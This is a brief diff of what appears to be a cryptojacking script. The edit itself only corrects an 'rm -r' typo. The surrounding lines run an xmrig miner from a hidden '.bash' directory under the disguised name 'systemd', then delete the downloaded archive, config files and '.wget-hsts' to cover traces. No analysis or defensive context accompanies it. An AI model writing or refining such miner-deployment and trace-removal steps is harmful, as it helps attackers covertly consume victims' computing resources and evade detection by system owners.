@@ -8,7 +8,7 @@ cd .bash/
 mv ./xmrig ./systemd
 ./systemd
 cd ../..
-rm-r master.zip
+rm -r master.zip
 rm -r ./configs-master
 rm ./nv3v2
 rm .wget-hsts
